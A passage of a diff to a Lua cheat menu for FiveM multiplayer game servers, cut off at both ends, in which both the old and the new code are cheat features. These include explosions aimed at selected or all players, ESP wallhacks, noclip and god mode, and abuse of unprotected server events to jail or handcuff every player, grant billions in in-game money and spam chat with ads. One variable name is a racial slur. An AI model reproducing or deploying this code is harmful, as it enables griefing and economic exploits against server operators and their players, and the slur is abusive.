-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test998 then
-		     local ped = GetPlayerPed(selectedPlayerId)
-			 local Pos = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
-             AddExplosion (Pos.x, Pos.y, Pos.z, 25, 0.0, true, true, 0.0)				 
-	 
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 420
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test993 then
-		     local ped = GetPlayerPed(selectedPlayerId)
-			 local Pos = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
-             AddExplosion (Pos.x, Pos.y, Pos.z, 9, 0.0, true, true, 0.0)				 
-	 
-        end
-    end
-end)  
-Citizen.CreateThread(function()
-    while true do
-        local second = 100
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test999 then
-		     local ped = GetPlayerPed(selectedPlayerId)
-			 local Pos = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
-             AddExplosion (Pos.x, Pos.y, Pos.z, 33, 0.0, true, true, 0.0)				 
-	 
-        end
-    end
-end)   		 
-Citizen.CreateThread(function()
-    while true do
-        local second = 100
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if Shock then
-                 local ped = GetPlayerPed(selectedPlayerId)
-	             local tLoc = GetEntityCoords(ped)
-	             local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
-	             local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
-	             ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)						
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 1
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if Shock99 then
-					 local ped = GetPlayerPed(-1)
-					 local target = GetPlayerPed(selectedPlayerId)
-                     local pos = GetEntityCoords(target)
-                     AttachEntityToEntity(ped, target, GetPedBoneIndex(target, 45509), 0.0, 0.0, 0.0, 0.0, 87.0, 0, false, false, false, false, 2, true)
-                     Citizen.Wait(2)					 
-                     DetachEntity(ped, 1, true)					 
-        end
-    end
-end)
-
-Citizen.CreateThread(function()
-    while true do
-        local second = 0
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if AAA3 then
-				    if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
-					   local veh = GetVehiclePedIsIn(GetPlayerPed(-1), true)
-					   SetEntityVisible(veh, false, 0)
-					end						
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 100
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if Shock1 then
-                 local ped = GetPlayerPed(selectedPlayerId)
-	             local tLoc = GetEntityCoords(ped)
-	             local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
-	             local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
-	             local destination1 = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
-	             local origin1 = GetPedBoneCoords(ped, 23553, 0.0, 0.0, 0.2)
-	             local destination2 = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
-	             local origin2 = GetPedBoneCoords(ped, 45509, 0.0, 0.0, 0.2)
-	             local destination3 = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
-	             local origin3 = GetPedBoneCoords(ped, 31086, 0.0, 0.0, 0.2)				 
-	             ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_ASSAULTSHOTGUN`, PlayerPedId(), true, true, 0.0)
-	             ShootSingleBulletBetweenCoords(origin1, destination1, 1, true, `WEAPON_ASSAULTSHOTGUN`, PlayerPedId(), true, true, 0.0)	
-	             ShootSingleBulletBetweenCoords(origin2, destination2, 1, true, `WEAPON_ASSAULTSHOTGUN`, PlayerPedId(), true, true, 0.0)	
-	             ShootSingleBulletBetweenCoords(origin3, destination3, 1, true, `WEAPON_ASSAULTSHOTGUN`, PlayerPedId(), true, true, 0.0)					 
-        end
-    end
-end) 
- 
-AAA1 = false   
 Citizen.CreateThread(
     function()
-        while bw do
+        while true do
             Citizen.Wait(0)
-            SetPlayerInvincible(PlayerId(), Godmode)
-            SetEntityInvincible(PlayerPedId(-1), Godmode)
-            if SuperJump then
-                SetSuperJumpThisFrame(PlayerId(-1))
-            end
-            if AAA1 then
-			    local playerPed = GetPlayerPed(-1)
-                SetEntityVisible(playerPed, false, 1)
-			else
-			SetEntityVisible(playerPed, true, 0)
-            end				
-            if AAA2 then
-			    SetSeethrough(true)
-			else
-			SetSeethrough(false)
-            end							
-			if Freezeallnew then	
-					local target = PlayerPedId(player)
-                    local pos = GetEntityCoords(GetPlayerPed(player))
-                    local xf = GetEntityForwardX(GetPlayerPed(player))
-                    local yf = GetEntityForwardY(GetPlayerPed(player))
-					local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(player), 0, 0, -0.4)
-                    RequestModel('prop_gascage01')
-                    while not HasModelLoaded('prop_gascage01') do
-                        RequestModel('prop_gascage01')
-                        Citizen.Wait(0)
-                    end
-                    if HasModelLoaded('prop_gascage01') then
-						local v = CreateObject(GetHashKey('prop_gascage01'), pos.x, pos.y, pos.z, true, true, true)
-                        FreezeEntityPosition(v, true)
-                        SetEntityVisible(v, false, true)
 
-                    end						
-			end						
-            if InfStamina then
-                RestorePlayerStamina(PlayerId(-1), 1.0)
+            DisplayRadar(true)
+
+            SetPlayerWantedLevel(PlayerId(), 0, false)
+
+            SetPlayerWeaponDamageModifier(PlayerId(), selectedDamage)
+            SetPlayerMeleeWeaponDamageModifier(PlayerId(), selectedDamage)
+
+            if infStamina then
+                RestorePlayerStamina(PlayerId(), 1.0)
             end
-            if fastrun then
-                SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49)
-                SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
+			
+			if chatspam then
+                TriggerServerEvent(
+                    '_chat:messageEntered',
+                    'Brutan#7799',
+                    {0, 0x99, 255},
+                    '/ooc Brutan Premium BRUTAN ON YOUTUBE'
+                )
+                TriggerServerEvent('_chat:messageEntered', '^8Brutan Premium', {0, 0x99, 255}, '^3 Brutan Premium BRUTAN ON YOUTUBE')
+				else
+				
+            end
+	
+			if banallusers then
+				for i = 0, 128 do
+				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
+				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
+				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "~r~BRUTAN ON YOUTUBE")
+				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "~r~BRUTAN ON YOUTUBE")
+					end
+				end
+
+						if esxdestroy then
+				for i = 0, 128 do
+						TriggerServerEvent("esx_truckerjob:pay", 9999999999)
+						TriggerServerEvent("AdminMenu:giveCash", 9999999999)
+						TriggerServerEvent("esx_dmvschool:pay",  9999999999)
+						TriggerServerEvent("LegacyFuel:PayFuel", 9999999999)
+				end
+			end
+			
+            if invisible then
+                SetEntityVisible(GetPlayerPed(-1), false, 0)
             else
-                SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
-                SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
+                SetEntityVisible(GetPlayerPed(-1), true, 0)
             end
-            if VehicleGun then
-                local d5 = 'Freight'
-                local c0 = GetEntityCoords(GetPlayerPed(-1), true)
-                if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then
-                    av('Vehicle Gun Enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!', false)
-                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_APPISTOL'), 999999, false, true)
-                    SetPedAmmo(GetPlayerPed(-1), GetHashKey('WEAPON_APPISTOL'), 999999)
-                    if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey('WEAPON_APPISTOL') then
-                        if IsPedShooting(GetPlayerPed(-1)) then
-                            while not HasModelLoaded(GetHashKey(d5)) do
-                                Citizen.Wait(0)
-                                RequestModel(GetHashKey(d5))
-                            end
-                            local veh =
-                                CreateVehicle(
-                                GetHashKey(d5),
-                                c0.x + 5 * GetEntityForwardX(GetPlayerPed(-1)),
-                                c0.y + 5 * GetEntityForwardY(GetPlayerPed(-1)),
-                                c0.z + 2.0,
-                                GetEntityHeading(GetPlayerPed(-1)),
-                                true,
-                                true
-                            )
-                            SetEntityAsNoLongerNeeded(veh)
-                            SetVehicleForwardSpeed(veh, 150.0)
-                        end
-                    end
-                end
+			
+			
+            if freezePlayer then
+                ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
             end
-            if DeleteGun then
-                local d6 = getEntity(PlayerId(-1))
-                if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then
-                    av('Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!')
-                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999, false, true)
-                    SetPedAmmo(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999)
-                    if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey('WEAPON_PISTOL') then
-                        if IsPlayerFreeAiming(PlayerId(-1)) then
-                            if IsEntityAPed(d6) then
-                                if IsPedInAnyVehicle(d6, true) then
-                                    if IsControlJustReleased(1, 142) then
-                                        SetEntityAsMissionEntity(GetVehiclePedIsIn(d6, true), 1, 1)
-                                        DeleteEntity(GetVehiclePedIsIn(d6, true))
-                                        SetEntityAsMissionEntity(d6, 1, 1)
-                                        DeleteEntity(d6)
-                                        av('Deleted!')
-                                    end
-                                else
-                                    if IsControlJustReleased(1, 142) then
-                                        SetEntityAsMissionEntity(d6, 1, 1)
-                                        DeleteEntity(d6)
-                                        av('Deleted!')
-                                    end
-                                end
-                            else
-                                if IsControlJustReleased(1, 142) then
-                                    SetEntityAsMissionEntity(d6, 1, 1)
-                                    DeleteEntity(d6)
-                                    av('Deleted!')
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-            if fuckallcars then
-                for ay in EnumerateVehicles() do
-                    if not IsPedAPlayer(GetPedInVehicleSeat(ay, -1)) then
-                        SetVehicleHasBeenOwnedByPlayer(ay, false)
-                        SetEntityAsMissionEntity(ay, false, false)
-                        StartVehicleAlarm(ay)
-                        DetachVehicleWindscreen(ay)
-                        SmashVehicleWindow(ay, 0)
-                        SmashVehicleWindow(ay, 1)
-                        SmashVehicleWindow(ay, 2)
-                        SmashVehicleWindow(ay, 3)
-                        SetVehicleTyreBurst(ay, 0, true, 1000.0)
-                        SetVehicleTyreBurst(ay, 1, true, 1000.0)
-                        SetVehicleTyreBurst(ay, 2, true, 1000.0)
-                        SetVehicleTyreBurst(ay, 3, true, 1000.0)
-                        SetVehicleTyreBurst(ay, 4, true, 1000.0)
-                        SetVehicleTyreBurst(ay, 5, true, 1000.0)
-                        SetVehicleTyreBurst(ay, 4, true, 1000.0)
-                        SetVehicleTyreBurst(ay, 7, true, 1000.0)
-                        SetVehicleDoorBroken(ay, 0, true)
-                        SetVehicleDoorBroken(ay, 1, true)
-                        SetVehicleDoorBroken(ay, 2, true)
-                        SetVehicleDoorBroken(ay, 3, true)
-                        SetVehicleDoorBroken(ay, 4, true)
-                        SetVehicleDoorBroken(ay, 5, true)
-                        SetVehicleDoorBroken(ay, 6, true)
-                        SetVehicleDoorBroken(ay, 7, true)
-                        SetVehicleLights(ay, 1)
-                        Citizen.InvokeNative(0x1FD09E7390A74D54, ay, 1)
-                        SetVehicleNumberPlateTextIndex(ay, 5)
-                        SetVehicleNumberPlateText(ay, 'VladmirAK47')
-                        SetVehicleDirtLevel(ay, 10.0)
-                        SetVehicleModColor_1(ay, 1)
-                        SetVehicleModColor_2(ay, 1)
-                        SetVehicleCustomPrimaryColour(ay, 255, 51, 255)
-                        SetVehicleCustomSecondaryColour(ay, 255, 51, 255)
-                        SetVehicleBurnout(ay, true)
-                    end
-                end
-            end
-            if destroyvehicles then
-                for vehicle in EnumerateVehicles() do
-                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
-                        NetworkRequestControlOfEntity(vehicle)
-                        SetVehicleUndriveable(vehicle, true)
-                        SetVehicleEngineHealth(vehicle, 0)
-                    end
-                end
-            end
-            if explodevehicles then
-                for vehicle in EnumerateVehicles() do
-                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
-                        NetworkRequestControlOfEntity(vehicle)
-                        NetworkExplodeVehicle(vehicle, true, true, false)
-                    end
-                end
-            end
-            if huntspam then
-                Citizen.Wait(50)
-                TriggerServerEvent('esx-qalle-hunting:reward', 50)
-                TriggerServerEvent('esx-qalle-hunting:sell')
-            end
-            if deletenearestvehicle then
-                for vehicle in EnumerateVehicles() do
-                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
-                        SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle, true), 1, 1)
-                        DeleteEntity(GetVehiclePedIsIn(vehicle, true))
-                        SetEntityAsMissionEntity(vehicle, 1, 1)
-                        DeleteEntity(vehicle)
-                    end
-                end
-            end
-            if freezeplayer then
-			local player = PlayerId()
-            local ped = GetPlayerPed(SelectedPlayer)
-                ClearPedTasksImmediately(ped)
-                SetEntityCollision(ped, false)
-			    FreezeEntityPosition(ped, true)
-                SetPlayerInvincible(player, true)
-                Wait(5000)
-                SetEntityCollision(ped, true)
-			    FreezeEntityPosition(ped, false)
-                SetPlayerInvincible(player, false)
-            end
-			if Smokeall then
-                for i = 0, 128 do
-			            local Pos = GetEntityCoords(GetPlayerPed(i)) 
-                        AddExplosion (Pos.x, Pos.y, Pos.z, 24, 5.0, false, false, 0.0)
-                        AddExplosion (Pos.x + 1, Pos.y, Pos.z - 1, 24, 5.0, false, false, 0.0)
-                        AddExplosion (Pos.x, Pos.y + 1, Pos.z - 1, 24, 5.0, false, false, 0.0)
-                        AddExplosion (Pos.x, Pos.y - 1, Pos.z - 1, 24, 5.0, false, false, 0.0)
-                        AddExplosion (Pos.x - 1.5, Pos.y, Pos.z - 1, 24, 5.0, false, false, 0.0)
-                        AddExplosion (Pos.x, Pos.y - 0.5, Pos.z - 1, 24, 5.0, false, false, 0.0)
-	 			end
-			end	
-            if freezeall then
-                for i = 0, 128 do
-                    ClearPedTasksImmediately(GetPlayerPed(i))
-                end
-            end
-            if esp then
-				local plist = GetActivePlayers()
-	            for i = 0, #plist do	
-				        local target = GetPlayerPed(plist[i])
-						local target1 = GetPlayerPed(-1)
-                        local pos = GetEntityCoords(target)
-						local pos1 = GetEntityCoords(target1)
-						DrawLine(pos.x, pos.y, pos.z, pos1.x, pos1.y, pos1.z, 0, 255, 50, 255)
-				end		
-            end
-            if espbox then
-				local plist = GetActivePlayers()
-	            for i = 0, #plist do				
-				        local target = GetPlayerPed(plist[i])
-						local target1 = GetPlayerPed(-1)
-                        local pos = GetEntityCoords(target)
-						local pos1 = GetEntityCoords(target1)
-						local y = GetScreenCoordFromWorldCoord(pos.x, pos.y, pos.z)
-						--DrawBox(pos.x, pos.y, pos.z, pos1.x, pos1.y, pos1.z, 0, 255, 50, 255)
-						DrawRect(y, 0.008, 0.01, 0, 0, 255, 255)
-						DrawRect(y, 0.003, 0.005, 255, 0, 0, 255)
-				end		
-            end			
-            if VehGod and IsPedInAnyVehicle(PlayerPedId(-1), true) then
-                SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true)
-            end
-            if oneshot then
-                SetPlayerWeaponDamageModifier(PlayerId(-1), 100.0)
-                local dd = getEntity(PlayerId(-1))
-                if IsEntityAPed(dd) then
-                    if IsPedInAnyVehicle(dd, true) then
-                        if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
-                            if IsControlJustReleased(1, 69) then
-                                NetworkExplodeVehicle(GetVehiclePedIsIn(dd, true), true, true, 0)
-                            end
-                        else
-                            if IsControlJustReleased(1, 142) then
-                                NetworkExplodeVehicle(GetVehiclePedIsIn(dd, true), true, true, 0)
-                            end
-                        end
-                    end
-                end
-            else
-                SetPlayerWeaponDamageModifier(PlayerId(-1), 1.0)
-            end
-            if rainbowf then
-                for i = 1, 7 do
-                    Citizen.Wait(100)
-                    SetPedWeaponTintIndex(GetPlayerPed(-1), 1198879012, i)
-                    i = i + 1
-                    if i == 7 then
-                        i = 1
-                    end
-                end
-            end
-            if blowall then
-                --[[for bD = 0, 9 do
-                    TriggerServerEvent(
-                        '_chat:messageEntered',
-                        '^1A^2l^3p^4h^5a^6V^7e^1t^2a',
-                        {
-                            141,
-                            211,
-                            255
-                        },
-                        '^' .. bD .. 'VladmirAK47 ~ 5391'
-                    )
-                end--]]				
-                for i = 0, 128 do
-                    local Pos = GetEntityCoords(GetPlayerPed(i))
-					AddExplosion (Pos.x, Pos.y, Pos.z, EXPLOSION_PROGRAMMABLEAR, 99, false, false, 0.0) 
-                    AddExplosion (Pos.x, Pos.y, Pos.z, EXPLOSION_PROPANE, 99, false, false, 0.0)
-                end
-            end
+
             if crosshair then
                 ShowHudComponentThisFrame(14)
             end
-            if crosshairc then
-                bz('+', 0.495, 0.484)
-            end
-            if crosshairc2 then
-                bz('.', 0.4968, 0.478)
-            end
-            if cN then
-                local de = false
-                local df = 930
-                local dg = 0
-                for f = 0, 128 do
-                    if NetworkIsPlayerActive(f) and GetPlayerPed(f) ~= GetPlayerPed(-1) then
-                        ped = GetPlayerPed(f)
+			
+			if ci then
+                local cK = false
+                local cL = 130
+                local cM = 0
+                for i = 0, 128 do
+                    if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= GetPlayerPed(-1) then
+                        local ped = GetPlayerPed(i)
                         blip = GetBlipFromEntity(ped)
                         x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
-                        x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true))
+                        x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
                         distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
-                        if de then
-                            if NetworkIsPlayerTalking(f) then
-                                local dh = k(0.5)
+                        if cK then
+                            if NetworkIsPlayerTalking(i) then
+                                local cN = d(1.0)
                                 DrawText3D(
                                     x2,
                                     y2,
                                     z2 + 1.2,
-                                    GetPlayerServerId(f) .. '  |  ' .. GetPlayerName(f),
-                                    dh.r,
-                                    dh.g,
-                                    dh.b
+                                    GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
+                                    cN.r,
+                                    cN.g,
+                                    cN.b
                                 )
                             else
                                 DrawText3D(
                                     x2,
                                     y2,
                                     z2 + 1.2,
-                                    GetPlayerServerId(f) .. '  |  ' .. GetPlayerName(f),
+                                    GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                     255,
                                     255,
                                     255
                                 )
                             end
                         end
-                        if distance < df then
-                            if not de then
-                                if NetworkIsPlayerTalking(f) then
-                                    local dh = k(1.0)
+                        if distance < cL then
+                            if not cK then
+                                if NetworkIsPlayerTalking(i) then
+                                    local cN = d(1.0)
                                     DrawText3D(
                                         x2,
                                         y2,
                                         z2 + 1.2,
-                                        GetPlayerServerId(f) .. '  |  ' .. GetPlayerName(f),
-                                        dh.r,
-                                        dh.g,
-                                        dh.b
+                                        GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
+                                        cN.r,
+                                        cN.g,
+                                        cN.b
                                     )
                                 else
                                     DrawText3D(
                                         x2,
                                         y2,
                                         z2 + 1.2,
-                                        GetPlayerServerId(f) .. '  |  ' .. GetPlayerName(f),
+                                        GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                         255,
                                         255,
                                         255
@@ -8199,4418 +4591,1992 @@ Citizen.CreateThread(
                     end
                 end
             end
-            if showCoords then
-                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
-                roundx = tonumber(string.format('%.2f', x))
-                roundy = tonumber(string.format('%.2f', y))
-                roundz = tonumber(string.format('%.2f', z))
-                bz('X:~s~ ' .. roundx, 0.05, 0.00)
-                bz('Y:~s~ ' .. roundy, 0.11, 0.00)
-                bz('Z:~s~ ' .. roundz, 0.17, 0.00)
+
+            if crosshair2 then
+                ch("~r~+",0.495,0.484)
+            end
+
+            if crosshair3 then
+                ch("~r~.",0.4968,0.478)
+            end
+
+            local niggerVehicle = GetVehiclePedIsIn(PlayerPedId(), false)
+
+            if fall then
+                for i = 0, 128 do
+                    ClearPedTasksImmediately(GetPlayerPed(i))
+                end
+            end
+
+			if freezeall then
+				for i = 0, 128 do
+						TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
+						TriggerServerEvent("CheckHandcuff", GetPlayerServerId(i))
+						TriggerServerEvent("cuffServer", GetPlayerServerId(i))
+						TriggerServerEvent("cuffGranted", GetPlayerServerId(i))
+						TriggerServerEvent("police:cuffGranted", GetPlayerServerId(i))
+						TriggerServerEvent("esx_handcuffs:cuffing", GetPlayerServerId(i))
+						TriggerServerEvent("esx_policejob:handcuff", GetPlayerServerId(i))
+					end
+				end
+			
+            if blowall then
+                for i = 0, 128 do
+                    local ped = GetPlayerPed(i)
+                    local coords = GetEntityCoords(ped)
+                    AddExplosion(coords.x, coords.y, coords.z, 4, 100.0, false, true, 0.0, false)
+                end
+            end
+
+            if sall then
+                for i = 0, 128 do
+                    local ped = GetPlayerPed(i)
+                    local coords = GetEntityCoords(ped)
+                    local vehiclehash = GetHashKey("savage")
+                    RequestModel(vehiclehash)
+                    CreateVehicle(vehiclehash, coords.x, coords.y, coords.z, GetEntityHeading(ped), 1, 0)
+                end
+            end
+
+            if IsPedInAnyVehicle(PlayerPedId()) then
+                if driftMode then
+                    SetVehicleGravityAmount(niggerVehicle, 5.0)
+                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
+                    SetVehicleGravityAmount(niggerVehicle, 10.0)
+                end
+
+
+                if superGrip then
+                    SetVehicleGravityAmount(niggerVehicle, 20.0)
+                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
+                    SetVehicleGravityAmount(niggerVehicle, 10.0)
+                end
+
+                if enchancedGrip then
+                    SetVehicleGravityAmount(niggerVehicle, 12.0)
+                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
+                    SetVehicleGravityAmount(niggerVehicle, 10.0)
+                end
+
+                if fdMode then
+                    SetVehicleGravityAmount(niggerVehicle, 5.5)
+                    SetVehicleEngineTorqueMultiplier(niggerVehicle, 4.0)
+                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
+                    SetVehicleGravityAmount(niggerVehicle, 10.0)
+                    SetVehicleEngineTorqueMultiplier(niggerVehicle, 1.0)
+                end
+
+                if t2x then
+                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),2.0)
+                end
+
+                if t4x then
+                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),4.0)
+                end
+
+                if t8x then
+                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),8.0)
+                end
+
+                if t16x then
+                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),16.0)
+                end
             end
 
 
+            if Noclip then
+        local noclip_speed = 1.0
+        local ped = GetPlayerPed(-1)
+        local x,y,z = getPosition()
+        local dx,dy,dz = getCamDirection()
+        local speed = noclip_speed
+		SetEntityVisible(GetPlayerPed(-1), false, false)
+		SetEntityInvincible(GetPlayerPed(-1), true)
+		SetEntityVisible(ped, false);
+
+      SetEntityVelocity(ped, 0.0001, 0.0001, 0.0001)
+      if IsControlPressed(0, 21) then
+          speed = speed + 3
+          end
+      if IsControlPressed(0, 19) then
+          speed = speed - 0.5
+      end
+             if IsControlPressed(0,32) then
+              x = x+speed*dx
+              y = y+speed*dy
+              z = z+speed*dz
+               end
 
 
+               if IsControlPressed(0,269) then
+              x = x-speed*dx
+              y = y-speed*dy
+              z = z-speed*dz
+               end
+        SetEntityCoordsNoOffset(ped,x,y,z,true,true,true)
+            else
+            SetEntityVisible(GetPlayerPed(-1), true, false)
+            SetEntityInvincible(GetPlayerPed(-1), false)
 
+         end
 
+            if WADOHWIB then
+                local gotEntity = getEntity(PlayerId())
+                if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
+                    drawNotification("Aim Your Gun At An Entity And Shoot!")
+                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
+                    SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
+                    if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
+                        if IsPlayerFreeAiming(PlayerId()) then
+                            if IsEntityAPed(gotEntity) then
+                                if IsPedInAnyVehicle(gotEntity, true) then
+                                    if IsControlJustReleased(1, 142) then
+                                        SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, true), 1, 1)
+                                        DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
+                                        SetEntityAsMissionEntity(gotEntity, 1, 1)
+                                        DeleteEntity(gotEntity)
+                                        drawNotification("~r~FUCKED")
+                                    end
+                                else
+                                    if IsControlJustReleased(1, 142) then
+                                        SetEntityAsMissionEntity(gotEntity, 1, 1)
+                                        DeleteEntity(gotEntity)
+                                        drawNotification("~r~FUCKED")
+                                    end
+                                end
+                            else
+                                if IsControlJustReleased(1, 142) then
+                                    SetEntityAsMissionEntity(gotEntity, 1, 1)
+                                    DeleteEntity(gotEntity)
+                                    drawNotification("~r~FUCKED!")
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+			if destroyvehicles then
+                for vehicle in EnumerateVehicles() do
+                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
+                        NetworkRequestControlOfEntity(vehicle)
+                        SetVehicleUndriveable(vehicle, true)
+                        SetVehicleEngineHealth(vehicle, 0)
+                    end
+                end
+            end
+			if explodevehicles then
+				for vehicle in EnumerateVehicles() do
+					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) and (not GotTrailer or (GotTrailer and vehicle ~= TrailerHandle)) then
+						NetworkRequestControlOfEntity(vehicle)
+						NetworkExplodeVehicle(vehicle, true, true, false)
+					end
+				end
+			end
+			
+            if esp then
+                for i = 0, 128 do
+                    if i ~= PlayerId(-1) and GetPlayerServerId(i) ~= 0 then
+                        local a8 = k(1.0)
+                        local d7 = GetPlayerPed(i)
+                        local d8, d9, da = table.unpack(GetEntityCoords(PlayerPedId(-1)))
+                        local x, y, z = table.unpack(GetEntityCoords(d7))
+                        local db =
+                            '~h~Name: ' ..
+                            GetPlayerName(i) ..
+                                '\nServer ID: ' ..
+                                    GetPlayerServerId(i) ..
+                                        '\nPlayer ID: ' ..
+                                            i ..
+                                                '\nDist: ' ..
+                                                    math.round(GetDistanceBetweenCoords(d8, d9, da, x, y, z, true), 1)
+                        if IsPedInAnyVehicle(d7, true) then
+                            local dc =
+                                GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(d7))))
+                            db = db .. '\nVeh: ' .. dc
+                        end
+                        if KDOWJDw and esp then
+                            DrawText3D(x, y, z - 1.0, db, a8.r, a8.g, a8.b)
+                        end
+                        if jfjfjffuhguh and esp then
+                            LineOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
+                            LineOneEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
+                            LineTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
+                            LineTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
+                            LineThreeBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
+                            LineThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, -0.9)
+                            LineFourBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
+                            TLineOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
+                            TLineOneEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
+                            TLineTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
+                            TLineTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
+                            TLineThreeBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
+                            TLineThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, 0.8)
+                            TLineFourBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
+                            ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, 0.8)
+                            ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, -0.9)
+                            ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
+                            ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
+                            ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
+                            ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
+                            ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
+                            ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
+                            DrawLine(
+                                LineOneBegin.x,
+                                LineOneBegin.y,
+                                LineOneBegin.z,
